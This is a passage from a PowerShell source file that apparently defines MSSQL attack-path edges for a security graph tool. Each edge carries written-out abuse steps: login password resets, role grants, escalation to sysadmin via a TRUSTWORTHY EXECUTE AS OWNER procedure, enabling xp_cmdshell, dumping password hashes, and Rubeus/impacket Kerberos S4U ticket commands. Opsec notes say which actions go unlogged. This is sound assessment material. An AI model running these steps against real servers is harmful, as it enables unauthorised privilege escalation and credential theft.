        return @{
            traversable = $false
            general = "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage. The `ALTER ANY APPLICATION ROLE` permission on a database allows the source $($context.principalNodeType) to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions."
            windowsAbuse = "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
            linuxAbuse = "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
            opsec = "This attack should not be performed as it will cause an immediate outage for the application using this role."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/application-roles?view=sql-server-ver17"
        }
    }
    
    "MSSQL_AlterAnyDBRole" = {
    # Offensive (non-traversable)
    #   Database level
    #       Source and target node types
    #           MSSQL_DatabaseUser      -> MSSQL_Database 
    #           MSSQL_DatabaseRole      -> MSSQL_Database
    #           MSSQL_ApplicationRole   -> MSSQL_Database
    #       Requirements
    #           ALTER ANY ROLE on the database
    #       Default fixed roles with permission
    #           db_owner (not drawing edge, included under ControlDB)
    #           db_securityadmin (can only alter user-defined roles)
    #           sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[DBRole])
    
        param($context)
        return @{
            traversable = $false
            general = "The `ALTER ANY ROLE` permission on a database allows the source $($context.principalNodeType) to add members to any user-defined database role. Note that only members of the db_owner fixed database role can add members to fixed database roles."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                USE $($context.databaseName);`n
                                EXEC sp_addrolemember 'role_name', 'user_name';"
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                USE $($context.databaseName);`n
                                EXEC sp_addrolemember 'role_name', 'user_name';"
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for additions to database role membership. `n
                    To view database role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
        }
    }     

    "MSSQL_AlterAnyLogin" = {
    # Offensive (non-traversable)
    #   Server level
    #       Source and target node types
    #           MSSQL_Login             -> MSSQL_Server
    #           MSSQL_ServerRole        -> MSSQL_Server
    #       Requirements
    #           ALTER ANY LOGIN on the server
    #       Default fixed roles with permission
    #           securityadmin
    #           ##MS_LoginManager##
    #           sysadmin (not drawing edge, included under ControlServer -> Contains[Login])
    
        param($context)
        return @{
            traversable = $false
            general = "The `ALTER ANY LOGIN` permission on a server allows the source $($context.principalNodeType) to change the password for any SQL login (as opposed to Windows login) that is not the fixed `sa` account. If the target has sysadmin or CONTROL SERVER, the principal making the change must also have sysadmin or CONTROL SERVER."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                `ALTER LOGIN [login] WITH PASSWORD = 'password';` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                `ALTER LOGIN [login] WITH PASSWORD = 'password';` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log events are not generated for password changes by default."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-login-transact-sql?view=sql-server-ver17 `n
                            - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
        }
    }
    
    "MSSQL_AlterAnyServerRole" = {
    # Offensive (non-traversable)
    #   Server level
    #       Source and target node types
    #           MSSQL_Login             -> MSSQL_Server
    #           MSSQL_ServerRole        -> MSSQL_Server
    #       Requirements
    #           SQL Server 2012 or higher (beginning of support for user-defined server roles)
    #           ALTER ANY SERVER ROLE on the server
    #       Default fixed roles with permission
    #           sysadmin (not drawing edge, included under ControlServer -> Contains[ServerRole])

        param($context)
        return @{
            traversable = $false
            general = "The `ALTER ANY SERVER ROLE` permission allows the source $($context.principalNodeType) to add members to any user-defined server role as well as add members to fixed server roles that the source $($context.principalNodeType) is a member of."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                `EXEC sp_addsrvrolemember @loginame = 'login', @rolename = 'role'` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                `EXEC sp_addsrvrolemember @loginame = 'login', @rolename = 'role'` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for additions to server role membership. `n
                    To view server role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
        }
    }   

    "MSSQL_Connect" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Server
    #       MSSQL_ServerRole        -> MSSQL_Server
    #   Requirements
    #       CONNECT SQL on the server
    #   Default fixed roles with permission
    #       Added to every new login by default

    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_Database
    #       MSSQL_DatabaseRole      -> MSSQL_Database
    #   Requirements
    #       CONNECT on the database
    #       Cannot be assigned to application roles
    #   Default fixed roles with permission
    #       Added to every new database user by default

    # For both the offensive and defensive use cases, this edge is non-traversable
    
        param($context)
        return @{
            traversable = $false
            general = $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER') {
                "The `CONNECT SQL` permission allows the source $($context.principalNodeType) to connect to the $($context.principal.SQLServerName) SQL Server if the login is not disabled or currently locked out. This permission is granted to every login created on the server by default."
            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE') {
                "The `CONNECT` permission allows the source $($context.principalNodeType) to connect to the $($context.targetPrincipal.Name) database. This permission is granted to every database user created in the database by default."
            })
            windowsAbuse = $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER') {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and authenticate with valid credentials for a server login"
            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE') {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and authenticate with valid credentials for a server login, then connect to the $($context.targetPrincipal.Name) database by executing `USE $($context.targetPrincipal.Name); GO;` "
            })
            linuxAbuse = $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER') {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and authenticate with valid credentials for a server login"
            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE') {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and authenticate with valid credentials for a server login, then connect to the $($context.targetPrincipal.Name) database by executing `USE $($context.targetPrincipal.Name); GO;` "
            })
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for failed login attempts and can be viewed by executing `EXEC sp_readerrorlog 0, 1, 'Login';), but successful login events are not logged by default.` "
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/policy-based-management/server-public-permissions?view=sql-server-ver16 `n
                            - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                            - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
        }
    }

    "MSSQL_ConnectAnyDatabase" = {
    # Offensive (non-traversable)
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Server
    #       MSSQL_ServerRole        -> MSSQL_Server
    #   Requirements
    #       CONNECT ANY DATABASE on the server
    #   Default fixed roles with permission
    #       ##MS_DatabaseConnector##

    # Defensive (non-traversable)
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Database
    #       MSSQL_ServerRole        -> MSSQL_Database
    #   Requirements
    #       CONNECT ANY DATABASE on the server
    #   Default fixed roles with permission
    #       ##MS_DatabaseConnector##    

    # For both the offensive and defensive use cases, this edge is non-traversable
    
        param($context)
        return @{
            traversable = $false
            general = $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER') {
                "The `CONNECT ANY DATABASE` permission allows the source $($context.principalNodeType) to connect to any database under the $($context.principal.SQLServerName) SQL Server without a mapped database user."
            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE') {
                "The `CONNECT ANY DATABASE` permission allows the source $($context.principalNodeType) to connect to the $($context.targetPrincipal.Name) database without a mapped database user."
            })
            windowsAbuse = $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER') {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and authenticate with valid credentials for a server login, then connect to any database by executing `USE <database_name>; GO;` "
            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE') {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and authenticate with valid credentials for a server login, then connect to the $($context.targetPrincipal.Name) database by executing `USE $($context.targetPrincipal.Name); GO;` "
            })
            linuxAbuse = $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER') {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and authenticate with valid credentials for a server login, then connect to any database by executing `USE <database_name>; GO;` "
            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE') {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and authenticate with valid credentials for a server login, then connect to the $($context.targetPrincipal.Name) database by executing `USE $($context.targetPrincipal.Name); GO;` "
            })
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for failed login attempts and can be viewed by executing `EXEC sp_readerrorlog 0, 1, 'Login';), but successful login events are not logged by default.` "
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/policy-based-management/server-public-permissions?view=sql-server-ver16 `n
                            - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                            - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
        }
    }

    "MSSQL_Contains" = {
    #   Source and target node types
    #       MSSQL_Server            -> MSSQL_Database
    #       MSSQL_Server            -> MSSQL_Login
    #       MSSQL_Server            -> MSSQL_ServerRole
    #       MSSQL_Database          -> MSSQL_DatabaseUser
    #       MSSQL_Database          -> MSSQL_DatabaseRole
    #       MSSQL_Database          -> MSSQL_ApplicationRole
    #   Requirements
    #       Child is under securable scope of parent
    #
    # This edge is needed for cases when control of a server or database object is gained without control of a login/user (e.g., from the host OS)

        param($context)
        return @{
            traversable = $true
            general = "The $($context.principalNodeType) contains the $($context.targetPrincipalNodeType). This is a structural relationship showing that the target exists within the scope of the source."
            windowsAbuse = "This is a structural relationship and cannot be directly abused. Control of $($context.principalNodeType) implies control of $($context.targetPrincipalNodeType)."
            linuxAbuse = "This is a structural relationship and cannot be directly abused. Control of $($context.principalNodeType) implies control of $($context.targetPrincipalNodeType)."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/principals-database-engine?view=sql-server-ver17"
        }
    }

    "MSSQL_ControlServer" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Server
    #       MSSQL_ServerRole        -> MSSQL_Server
    #   Requirements
    #       CONTROL SERVER on the server object
    #       (not modeled) Explicit deny permissions on specific objects trump CONTROL SERVER
    #   Default fixed roles with permission
    #       sysadmin
    
        param($context)
        return @{
            traversable = $true
            general = "The `CONTROL SERVER` permission on a server allows the source $($context.principalNodeType) to conduct any action in the instance of SQL Server that is not explicitly denied. An exception is for members of the sysadmin server role, in which case explicit denies are ignored."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                `SELECT * FROM sys.sql_logins; -- dump hashes` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                `SELECT * FROM sys.sql_logins; -- dump hashes` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log event generation is dependent on the action performed."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#sql-server-permissions `n
                          - https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                          - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
        }
    }

    "MSSQL_ExecuteAsOwner" = {
    # Database level
    #   Source and target node types
    #       MSSQL_Database      -> MSSQL_Server
    #   Requirements
    #       Database has TRUSTWORTHY ON
    #       Database owner has high privileges (sysadmin, securityadmin, CONTROL SERVER, or IMPERSONATE ANY LOGIN)
    #       Principal can create or modify stored procedures, functions, or CLR assemblies in the database
    #   Notes
    #       Allows database principals to escalate to server-level privileges through EXECUTE AS OWNER

        param($context)
        return @{
            traversable = $true
            general = "The source $($context.principalNodeType) can escalate privileges to the server level by creating or modifying database objects (stored procedures, functions, or CLR assemblies) that use EXECUTE AS OWNER. Since the database is TRUSTWORTHY and owned by a highly privileged login, code executing as the owner will have those elevated server privileges."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:`n
                                `USE $($context.databaseName);` `n
                                `GO` `n
                                `CREATE PROCEDURE dbo.EscalatePrivs` `n
                                `WITH EXECUTE AS OWNER` `n
                                `AS` `n
                                `BEGIN` `n
                                `    -- Add current login to sysadmin role` `n
                                `    EXEC sp_addsrvrolemember @loginame = '$($context.principalNodeType)', @rolename = 'sysadmin';` `n
                                `    -- Impersonate the sa login` `n
                                `    EXECUTE AS LOGIN = 'sa';` `n
                                `       -- Now executing with sa privileges` `n
                                `       SELECT SUSER_NAME():` `n
                                `       -- Perform privileged actions here` `n
                                `    REVERT;` `n                                
                                `END;` `n
                                `GO` `n
                                `EXEC dbo.EscalatePrivs;` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:`n
                                `USE $($context.databaseName);` `n
                                `GO` `n
                                `CREATE PROCEDURE dbo.EscalatePrivs` `n
                                `WITH EXECUTE AS OWNER` `n
                                `AS` `n
                                `BEGIN` `n
                                `    -- Add current login to sysadmin role` `n
                                `    EXEC sp_addsrvrolemember @loginame = '$($context.principalNodeType)', @rolename = 'sysadmin';` `n
                                `    -- Impersonate the sa login` `n
                                `    EXECUTE AS LOGIN = 'sa';` `n
                                `       -- Now executing with sa privileges` `n
                                `       SELECT SUSER_NAME():` `n
                                `       -- Perform privileged actions here` `n
                                `    REVERT;` `n
                                `END;` `n
                                `GO` `n
                                `EXEC dbo.EscalatePrivs;` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. `n
                    Creating stored procedures is not logged by default. However, adding members to the sysadmin role is logged. `n
                    To view server role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-clause-transact-sql?view=sql-server-ver17 `n
                        - https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet"
            composition = 
                "MATCH 
                (database:MSSQL_Database {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), 
                (server:MSSQL_Server {objectid: database.SQLServerID}), 
                (owner:MSSQL_Login {objectid: toUpper(database.OwnerObjectIdentifier)})
                MATCH p0 = (database)-[:MSSQL_ExecuteAsOwner]->(server)
                MATCH p1 = (owner)-[:MSSQL_Owns]->(database)
                OPTIONAL MATCH p2 = (owner)-[:MSSQL_ControlServer|:MSSQL_ImpersonateAnyLogin]->(server)
                OPTIONAL MATCH p3 = (owner)-[:MSSQL_MemberOf*]->(:MSSQL_ServerRole)-[:MSSQL_ControlServer|:MSSQL_ImpersonateAnyLogin|:MSSQL_GrantAnyPermission]->(server)
                RETURN p0, p1, p2, p3"
        }
    }    

    "MSSQL_ExecuteOnHost" = {
    #   Source and target node types
    #       MSSQL_Server            -> Computer
    #   Requirements
    #       Control of a SQL Server instance allows xp_cmdshell or other OS command execution capabilities to be used

        param($context)
        return @{
            traversable = $true
            general = "Control of a SQL Server instance allows xp_cmdshell or other OS command execution capabilities to be used to access the host computer in the context of the account running the SQL server."
            windowsAbuse = "Enable and use xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';` "
            linuxAbuse = "Enable and use xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';` "
            opsec = "xp_cmdshell configuration option changes are logged in SQL Server error logs. View the log by executing: `EXEC sp_readerrorlog 0, 1, 'xp_cmdshell';` "
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17"
            composition = 
            "MATCH 
            (server:MSSQL_Server {objectid: '$($context.principal.ObjectIdentifier.ToUpper())'}), 
            (computer:Computer {objectid: '$($context.principal.ObjectIdentifier.Split(':')[0].ToUpper())'})
            MATCH p0 = (server)-[:MSSQL_ExecuteOnHost]->(computer)
            OPTIONAL MATCH p1 = (serviceAccount)-[:MSSQL_ServiceAccountFor]->(server)
            RETURN p0, p1"
        }
    }

    "MSSQL_GetAdminTGS" = {
    #   Source and target node types
    #       Base                    -> MSSQL_Server
    #   Requirements
    #       Source is the SQL Server service account
    #       At least one domain account with SQL login has sysadmin or equivalent privileges

        param($context)
        return @{
            traversable = $true
            general = "The SQL Server service account can request Kerberos service tickets for domain accounts that have administrative privileges on this SQL Server."
            windowsAbuse = "From a domain-joined machine as the service account (or with valid credentials):`n
                                `# List SPNs for the SQL Server to find target accounts:` `n
                                `setspn -L $($context.targetPrincipal.Name)` `n
                                `# Request TGT for the service account:` `n
                                `.\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> /password:<password> /nowrap` `n
                                `# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain DBA:` `n
                                `Rubeus.exe s4u /impersonateuser:<dba> /altservice:<spn> /self /nowrap /ticket:<base64>` `n
                                `# Start a sacrificial logon session for the Kerberos ticket:` `n
                                ``runas /netonly /user:asdf powershell` `n
                                `# Import the ticket into the sacrificial logon session:` `n
                                `Rubeus.exe ptt /ticket:<base64>` `n
                                `# Launch SQL Server Management Studio or sqlcmd and connect to the database.` "
            linuxAbuse = "From a Linux machine with valid credentials:`n
                                `# Request TGT for the service account:` `n
                                `getTGT.py internal.lab/sqlsvc:P@ssw0rd ` `n
                                `# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain DBA:` `n
                                `python3 gets4uticket.py kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\$@internal.lab sccm_s4u.ccache -v` `n
                                `# Connect to the  database:` `n
                                `KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\$@sql.internal.lab  -k -no-pass -windows-auth` "
            opsec = "Kerberos ticket requests are normal behavior and rarely logged. High volume of TGS requests might be detected by advanced threat hunting. Event ID 4769 (Kerberos Service Ticket Request) is logged on domain controllers but typically not monitored for SQL service accounts."
            references = "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17 "
            composition = 
            "MATCH 
            (serviceAccount {objectid: '$($context.principal.ObjectIdentifier.ToUpper())'})
            MATCH p0 = (serviceAccount)-[:MSSQL_GetAdminTGS]->(server:MSSQL_Server {objectid: '$($context.targetPrincipal.ObjectIdentifier.ToUpper())'})
            MATCH p1 = (server)-[:MSSQL_Contains]->(login:MSSQL_Login {isActiveDirectoryPrincipal: true})
            OPTIONAL MATCH p2 = (login)-[:MSSQL_ControlServer|:MSSQL_GrantAnyPermission|:MSSQL_ImpersonateAnyLogin]->(server)
            OPTIONAL MATCH p3 = (login)-[:MSSQL_MemberOf*]->(:MSSQL_ServerRole)-[:MSSQL_ControlServer|:MSSQL_GrantAnyPermission|:MSSQL_ImpersonateAnyLogin]->(server)
            WITH serviceAccount, server, login, p0, p2, p3
            WHERE p2 IS NOT NULL OR p3 IS NOT NULL
            OPTIONAL MATCH p4 = ()-[:MSSQL_HasLogin]->(login)
            RETURN p0, p2, p3, p4"
        }
    }

    "MSSQL_GetTGS" = {
    #   Source and target node types
    #       Base                    -> MSSQL_Login
    #   Requirements
    #       Source is the SQL Server service account
    #       Target is a domain account with SQL login

        param($context)
        return @{
            traversable = $true
            general = "The SQL Server service account can request Kerberos service tickets for domain accounts that have a login on this SQL Server."
            windowsAbuse = "From a domain-joined machine as the service account (or with valid credentials):`n
                                `# List SPNs for the SQL Server to find target accounts:` `n
                                `setspn -L $($context.targetPrincipal.Name)` `n
                                `# Request TGT for the service account:` `n
                                `.\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> /password:<password> /nowrap` `n
                                `# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain account:` `n
                                `Rubeus.exe s4u /impersonateuser:<account> /altservice:<spn> /self /nowrap /ticket:<base64>` `n
                                `# Start a sacrificial logon session for the Kerberos ticket:` `n
                                ``runas /netonly /user:asdf powershell` `n
                                `# Import the ticket into the sacrificial logon session:` `n
                                `Rubeus.exe ptt /ticket:<base64>` `n
                                `# Launch SQL Server Management Studio or sqlcmd and connect to the database.` "
            linuxAbuse = "From a Linux machine with valid credentials:`n
                                `# Request TGT for the service account:` `n
                                `getTGT.py internal.lab/sqlsvc:P@ssw0rd ` `n
                                `# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain account:` `n
                                `python3 gets4uticket.py kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\$@internal.lab sccm_s4u.ccache -v` `n
                                `# Connect to the  database:` `n
                                `KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\$@sql.internal.lab  -k -no-pass -windows-auth` "
            opsec = "Kerberos ticket requests are normal behavior and rarely logged. High volume of TGS requests might be detected by advanced threat hunting. Event ID 4769 (Kerberos Service Ticket Request) is logged on domain controllers but typically not monitored for SQL service accounts."
            references = "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17 "
        }
    }    

    "MSSQL_GrantAnyPermission" = {
    # Server level
    #   Source and target node types
    #       MSSQL_ServerRole        -> MSSQL_Server
    #   Requirements
    #       securityadmin fixed server role
    #   Notes
    #       securityadmin can grant ANY server permission to any login, including CONTROL SERVER

        param($context)
        return @{
            traversable = $true
            general = "The securityadmin fixed server role can grant any server-level permission to any login, including CONTROL SERVER. This effectively allows members to grant themselves or others full control of the SQL Server instance."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as a member of securityadmin (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:`n
                                `-- Grant CONTROL SERVER to yourself or another login` `n
                                `GRANT CONTROL SERVER TO [target_login];` `n
                                `-- Or grant specific high privileges` `n
                                `GRANT IMPERSONATE ANY LOGIN TO [target_login];` `n
                                `GRANT ALTER ANY LOGIN TO [target_login];` `n
                                `GRANT ALTER ANY SERVER ROLE TO [target_login];` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as a member of securityadmin (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:`n
                                `-- Grant CONTROL SERVER to yourself or another login` `n
                                `GRANT CONTROL SERVER TO [target_login];` `n
                                `-- Or grant specific high privileges` `n
                                `GRANT IMPERSONATE ANY LOGIN TO [target_login];` `n
                                `GRANT ALTER ANY LOGIN TO [target_login];` `n
                                `GRANT ALTER ANY SERVER ROLE TO [target_login];` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. `n
                    Permission grants are not logged by default in the trace log."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17#fixed-server-level-roles `n
                          - https://learn.microsoft.com/en-us/sql/t-sql/statements/grant-server-permissions-transact-sql?view=sql-server-ver17 `n
                          - https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/"
        }
    }

    "MSSQL_GrantAnyDBPermission" = {
    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseRole      -> MSSQL_Database
    #   Requirements
    #       db_securityadmin fixed database role

        param($context)
        return @{
            traversable = $true
            general = "The db_securityadmin fixed database role db_securityadmin can create roles, manage role memberships, and grant all database permissions, effectively granting full database control."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as a member of db_securityadmin (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:`n
                                `USE $($context.targetPrincipal.Name);` `n
                            `   -- Create a role` `n
                            `   CREATE ROLE [EvilRole];` `n
                            `   -- Add self` `n
                            `   EXEC sp_addrolemember 'EvilRole', 'db_secadmin';` `n
